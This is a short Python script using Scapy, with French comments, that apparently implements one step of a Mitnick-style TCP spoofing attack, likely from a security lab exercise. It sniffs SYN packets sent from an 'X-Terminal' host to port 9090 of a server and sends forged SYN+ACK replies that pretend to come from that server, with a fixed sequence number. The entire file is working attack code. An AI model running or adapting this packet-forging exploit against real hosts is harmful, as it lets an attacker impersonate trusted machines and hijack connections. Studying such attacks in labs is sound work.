#!/usr/bin/python3
from scapy.all import *

x_ip     = "10.99.46.189"
srv_ip   = "10.99.46.51"
srv_port = 9090

def spoof_second(pkt):
    old_ip  = pkt[IP]
    old_tcp = pkt[TCP]

    print("{}:{} -> {}:{} Flags={}".format(
        old_ip.src, old_tcp.sport,
        old_ip.dst, old_tcp.dport,
        old_tcp.flags))

    # X-Terminal envoie SYN vers port 9090
    if old_tcp.flags == "S":
        ip = IP(src=srv_ip, dst=x_ip)
        tcp = TCP(sport=srv_port,
                  dport=old_tcp.sport,
                  flags="SA",
                  seq=0x2000,
                  ack=old_tcp.seq + 1)
        send(ip/tcp, verbose=0)
        print("[+] SYN+ACK envoyé pour 2ème connexion")

# Sniff SYN venant de X-Terminal vers port 9090
myFilter = 'tcp and src host 10.99.46.189 and dst host 10.99.46.51 and dst port 9090'
print("[*] Sniffing en attente du SYN vers port 9090...")
sniff(filter=myFilter, prn=spoof_second)